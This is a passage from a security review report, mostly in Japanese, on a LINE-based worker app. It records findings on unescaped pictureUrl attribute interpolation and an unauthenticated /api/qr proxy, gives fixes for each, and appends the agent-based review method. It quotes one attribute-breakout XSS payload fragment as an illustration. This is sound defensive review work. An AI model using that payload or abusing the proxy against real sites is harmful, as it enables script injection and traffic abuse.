- **completionPage の pictureUrl を src 属性へ未エスケープ展開(多層防御欠如)** — `apps/worker/src/routes/liff.ts:1707` (`sec-injection`, PLAUSIBLE)
  - completionPage() (1682-1715) は同関数内で displayName(1708)と ref(1711)を escapeHtml 処理する一方、pictureUrl は <img src="${pictureUrl}" alt="">(1707)に無エスケープで展開している。現状 pictureUrl は /auth/callback で LINE の /v2/profile 応答(profile.pictureUrl、808-821)由来=LINE制御のCDN URLのため実悪用性は低いが、隣接フィールドと不整合で、将来 pictureUrl の供給元がリクエスト由来値に変わると属性ブレイクアウトXSS("><img src=x onerror=...>)になる。
  - 推奨: displayName/ref と同様に escapeHtml(pictureUrl) で囲み、一貫した出力エンコードと多層防御を確保する。
- **/api/qr が未認証のオープンプロキシで、上限なしに外部へファンアウトする** — `apps/worker/src/index.ts:220` (`x-config-dos`, CONFIRMED)
  - /api/qr(index.ts:215-228)は auth 除外(auth.ts:181)で未認証、`data` クエリを検証・長さ制限なしにそのまま upstream(api.qrserver.com)へ URL エンコードして fetch(220)し、レスポンス body を無制限にストリームで返す(222-227)。上流ホストは固定なので SSRF ではないが、Worker を経由した第三者への egress チャネル/増幅として使え、1 リクエストごとに 1 サブリクエストを消費する。唯一の抑止が in-memory の IP レート制限(本 dimension の別所見のとおり実効性が低い)であるため、事実上ほぼ無制限に外部トラフィックを中継させられる。
  - 推奨: `data`/`size` の長さ・形式を厳格に検証し、上流応答に Content-Length 上限を設ける。QR 生成は自己ホスト(依存ライブラリ)へ切り替えて外部プロキシ自体を廃止するか、少なくとも実効的な共有レート制限を適用する。
- **LINE profile pictureUrl interpolated unescaped into an <img src> attribute** — `apps/worker/src/client/form.ts:381` (`x-web-frontend`, PLAUSIBLE)
  - profile.pictureUrl (from liff.getProfile()) is interpolated with no escaping at all into a double-quoted src attribute: <img src="${profile.pictureUrl}" alt="" /> (form.ts:381, and identically in main.ts:114 and main.ts:204). Unlike the surrounding displayName which is passed through escapeHtml, the URL is raw. Exploitability is low because the value is a LINE-CDN URL controlled by LINE rather than the user, but it is a genuine unescaped attribute interpolation and a quote in the value would break out of the attribute.
  - 推奨: Pass pictureUrl through the (fixed, quote-escaping) escapeHtml before interpolation, or set it via img.setAttribute('src', pictureUrl) on a created element. Apply to form.ts:381 and main.ts:114/204.

## 付録: レビュー次元（17）

| グループ | 次元 |
|---|---|
| バグ/正当性 | `bug-core-routes` |
| バグ/正当性 | `bug-delivery-cron` |
| バグ/正当性 | `bug-crm-automation` |
| バグ/正当性 | `bug-attribution` |
| バグ/正当性 | `bug-db-migrations` |
| バグ/正当性 | `bug-booking-events` |
| セキュリティ | `sec-authn-authz` |
| セキュリティ | `sec-injection` |
| セキュリティ | `sec-secrets` |
| セキュリティ | `sec-public-webhooks` |
| セキュリティ | `sec-tenant-isolation` |
| 個人情報保護 | `pii-at-rest` |
| 個人情報保護 | `pii-in-logs` |
| 個人情報保護 | `pii-in-transit` |
| 個人情報保護 | `pii-retention-deletion` |
| 横断(設定/フロント) | `x-config-dos` |
| 横断(設定/フロント) | `x-web-frontend` |

各次元は独立したクリーンセッションのエージェントが担当し、実コードを Read して file:line 根拠つきで所見を報告。
その後、別のクリーンセッション検証者が各所見を「別箇所のガードで無効化されていないか」観点で反証（対立レビュー）。
REJECTED を除外し、CONFIRMED/PLAUSIBLE のみ本書に採録。
